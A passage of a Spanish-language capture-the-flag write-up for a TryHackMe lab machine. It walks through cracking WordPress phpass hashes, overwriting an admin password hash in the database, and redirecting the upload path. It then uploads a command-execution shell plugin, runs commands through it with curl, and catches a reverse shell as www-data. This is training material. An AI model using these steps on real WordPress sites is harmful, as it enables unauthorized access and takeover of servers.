+Loaded &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; password hashes with &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; different salts &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;phpass &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;phpass &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$P&lt;/span&gt;$ or &lt;span class=&#34;nv&#34;&gt;$H&lt;/span&gt;$&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 256/256 AVX2 8x3&lt;span class=&#34;o&#34;&gt;])&lt;/span&gt;
+Cost &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;iteration count&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; is &lt;span class=&#34;m&#34;&gt;8192&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; all loaded hashes
+Will run &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; OpenMP threads
+Press &lt;span class=&#34;s1&#34;&gt;&amp;#39;q&amp;#39;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; status
+NOTAPASSWORD            &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;?&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Warning: Only &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; candidates left, minimum &lt;span class=&#34;m&#34;&gt;96&lt;/span&gt; needed &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; performance.
+1g 0:00:00:01 DONE &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;2021-04-19 21:30&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 0.7575g/s 37878p/s 38169c/s 38169C/s bobocel..alexis15
+Use the &lt;span class=&#34;s2&#34;&gt;&amp;#34;--show --format=phpass&amp;#34;&lt;/span&gt; options to display all of the cracked passwords reliably
+
+&lt;span class=&#34;c1&#34;&gt;#$P$BEyLE6bPLjgWQ3IHrLu3or19t0faUh.:123455&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Intentamos realizar la escritura de una shell utilizando SQL pero al parecer mysql esta &lt;a href=&#34;https://stackoverflow.com/a/32737616&#34;&gt;limitado&lt;/a&gt; a la carga y escritura de archivos, solamente esta permitida la escritura en una carpeta previamente configurada &lt;a href=&#34;https://stackoverflow.com/a/64415075&#34;&gt;&lt;strong&gt;/var/lib/mysql-files/&lt;/strong&gt;&lt;/a&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/differentctf/Screenshot_4.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Además encontramos un dominio dentro de las opciones del usuario &lt;code&gt;hakankey01&lt;/code&gt; &lt;strong&gt;-&amp;gt;&lt;/strong&gt; &lt;code&gt;asd.thm&lt;/code&gt; en ambas bases de datos, tambien dentro de la tabla &lt;code&gt;wp_option&lt;/code&gt; vemos un subdominio especificamente en &lt;code&gt;phpmyadmin1&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/differentctf/Screenshot_6.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Con la informacion anterior podriamos decir que existen dos bases de datos distintas para dos direcciones de Wordpress. Agregamos el subdominio al archivo &lt;code&gt;/etc/hosts&lt;/code&gt;, al visitar el subdominio vemos el mismo tema y contenido.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/differentctf/Screenshot_7.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;wp_user&#34;&gt;WP_USER&lt;/h2&gt;
+&lt;p&gt;Editamos la contraseña del usuario &lt;code&gt;hackandbey01&lt;/code&gt; en las base de datos con un hash nuevo que generamos en &lt;a href=&#34;https://asecuritysite.com/encryption/phpass&#34;&gt;secure-site&lt;/a&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$P$5&lt;/span&gt;ZDzPE45Ci.QxPaPz.03z6TYbakcSQ0 --&amp;gt; password
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Luego de unos segundos logramos obtener acceso con la nueva contraseña en el panel de ambos wordpress, aunque no logramos subir ningun tipo de archivo o plugin para obtener una shell ya que no tenemos suficientes permisos en el directorio actual.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/differentctf/Screenshot_5.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;ftp--wordpress&#34;&gt;FTP &amp;gt; WORDPRESS&lt;/h2&gt;
+&lt;p&gt;Anteriormente intentamos subir archivos a FTP pero encontramos que &lt;code&gt;adana.thm&lt;/code&gt; no estaba relacionado al directorio de FTP, al subir un archivo a FTP intentamos realizar una solicitud al archivo subido en el subdominio y observamos que este subdominio si está relacionado al directorio de FTP más no tenemos acceso a estos archivos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;╭─kali@kali ~/thm/differentctf  
+╰─➤  cat i.txt 
+hello
+╭─kali@kali ~/thm/differentctf  
+╰─➤  curl -sI http://subdomain.adana.thm/wp-content/plugins/akismet/i.txt      
+HTTP/1.1 &lt;span class=&#34;m&#34;&gt;403&lt;/span&gt; Forbidden
+Date: Wed, &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 04:54:54 GMT
+Server: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;iso-8859-1
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Verificamos en el servicio FTP y vemos que los permisos del archivo subido (&lt;code&gt;i.txt&lt;/code&gt;) es diferente (600) al que los demás archivos (644).&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;ftp&amp;gt; ls -lah
+&lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; PORT &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; successful. Consider using PASV.
+&lt;span class=&#34;m&#34;&gt;150&lt;/span&gt; Here comes the directory listing.
+drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt; 04:54 .
+drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt; 04:38 ..
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;          &lt;span class=&#34;m&#34;&gt;629&lt;/span&gt; May &lt;span class=&#34;m&#34;&gt;09&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2016&lt;/span&gt; .htaccess
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;18092&lt;/span&gt; Aug &lt;span class=&#34;m&#34;&gt;24&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2015&lt;/span&gt; LICENSE.txt
+drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Dec &lt;span class=&#34;m&#34;&gt;08&lt;/span&gt; 22:13 _inc
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;2543&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;22&lt;/span&gt; 19:16 akismet.php
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;20307&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; changelog.txt
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;49941&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; class.akismet-admin.php
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;4663&lt;/span&gt; Jun &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; class.akismet-cli.php
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;11135&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;30&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2018&lt;/span&gt; class.akismet-rest-api.php
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;2856&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;13&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2017&lt;/span&gt; class.akismet-widget.php
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;        &lt;span class=&#34;m&#34;&gt;58662&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;19&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt; class.akismet.php
+-rw-------    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;            &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt; 04:54 i.txt
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;           &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; Mar &lt;span class=&#34;m&#34;&gt;10&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2014&lt;/span&gt; index.php
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;2386&lt;/span&gt; Dec &lt;span class=&#34;m&#34;&gt;04&lt;/span&gt; 15:04 readme.txt
+drwxr-xr-x    &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Dec &lt;span class=&#34;m&#34;&gt;08&lt;/span&gt; 22:13 views
+-rw-r--r--    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;1001&lt;/span&gt;         &lt;span class=&#34;m&#34;&gt;6438&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;02&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2019&lt;/span&gt; wrapper.php
+&lt;span class=&#34;m&#34;&gt;226&lt;/span&gt; Directory send OK.
+ftp&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h1 id=&#34;upload_path--www-data&#34;&gt;UPLOAD_PATH &amp;gt; WWW-DATA&lt;/h1&gt;
+&lt;p&gt;Como se menciono anteriormente Wordpress mostraba error de permisos de escritura, realizamos una busqueda de los errores que wordpress nos mostraba, la mayoria de las &amp;ldquo;soluciones&amp;rdquo; explica que se debe de cambiar los permisos a la carpeta &lt;code&gt;wp-content&lt;/code&gt; pero se necesita acceso a la maquina. En el area de soporte de Wordpress encontramos un &lt;a href=&#34;https://wordpress.org/support/topic/is-its-parent-directory-writable-by-the-server-14/#post-13767059&#34;&gt;comentario&lt;/a&gt; que indica la opcion &lt;code&gt;upload_path&lt;/code&gt; en &lt;code&gt;wp_options&lt;/code&gt; y enlaza un &lt;a href=&#34;https://youtu.be/w6LOPiNZ6TE?t=105&#34;&gt;video&lt;/a&gt; de como cambiar y solucionar este error en la base de datos.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/differentctf/Screenshot_9.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Verificamos la direccion en la base de datos de &lt;code&gt;phpmyadmin&lt;/code&gt; y observamos que está vacia, por lo que agregamos una direccion en este caso &lt;code&gt;/dev/shm&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/differentctf/Screenshot_8.png&#34; alt=&#34;image&#34; /&gt;&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/differentctf/Screenshot_10.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Intentamos subir un archivos los cuales se subieron correctamente aunque no se podian visualizar.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/differentctf/Screenshot_11.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Realizamos lo mismo en el subdominio, extrañamente pasaba lo mismo.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/differentctf/Screenshot_12.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;h2 id=&#34;plugin--shell&#34;&gt;PLUGIN &amp;gt; SHELL&lt;/h2&gt;
+&lt;p&gt;Intentamos subir un &lt;a href=&#34;https://github.com/leonjza/wordpress-shell&#34;&gt;plugin para ejecucion de comandos&lt;/a&gt;, además utilizamos las credenciales FTP y direccion &lt;code&gt;127.0.0.1&lt;/code&gt;.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/differentctf/Screenshot_13.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;El plugin se subió correctamente más no apareció en la direccion que debería al intentar ejecutar comandos.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;╭─kali@kali ~/thm/differentctf/tmp  
+╰─➤  curl -sI &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://adana.thm/wp-content/plugins/shell/shell.php?cmd=id&amp;#34;&lt;/span&gt;
+HTTP/1.1 &lt;span class=&#34;m&#34;&gt;404&lt;/span&gt; Not Found
+Date: Wed, &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 07:45:43 GMT
+Server: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;iso-8859-1
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Intentamos subir el mismo plugin en wordpress del subdominio pero aparecia como ya instalado.&lt;br /&gt;
+&lt;img src=&#34;https://sckull.github.io/images/posts/thm/differentctf/Screenshot_14.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;Realizamos la ejecucion de comandos con el plugin pero utilizando la direccion del subdominio en el cual si logramos la ejecucion.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;╭─kali@kali ~/thm/differentctf/tmp  
+╰─➤  curl -I &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://subdomain.adana.thm/wp-content/plugins/shell/shell.php?cmd=id&amp;#34;&lt;/span&gt;
+HTTP/1.1 &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; OK
+Date: Wed, &lt;span class=&#34;m&#34;&gt;21&lt;/span&gt; Apr &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; 07:51:29 GMT
+Server: Apache/2.4.29 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+Content-Type: text/html&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;charset&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;UTF-8
+
+╭─kali@kali ~/thm/differentctf/tmp  
+╰─➤  curl -s &lt;span class=&#34;s2&#34;&gt;&amp;#34;http://subdomain.adana.thm/wp-content/plugins/shell/shell.php?cmd=id&amp;#34;&lt;/span&gt; 
+&lt;span class=&#34;nv&#34;&gt;uid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;33&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www-data&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;gid&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;33&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www-data&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;groups&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;33&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;www-data&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Ejecutamos una shell inversa con python, logramos obtener acceso con el usuario &lt;code&gt;www-data&lt;/code&gt; y leer nuestra flag &lt;code&gt;web.txt&lt;/code&gt;.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;╭─kali@kali ~/thm/differentctf  
+╰─➤  listen &lt;span class=&#34;m&#34;&gt;1338&lt;/span&gt;
+listening on &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;any&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;1338&lt;/span&gt; ...
+connect to &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.2.29.162&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; from adana.thm &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;10.10.36.103&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;59122&lt;/span&gt;
+/bin/sh: 0: can&lt;span class=&#34;s1&#34;&gt;&amp;#39;t access tty; job control turned off
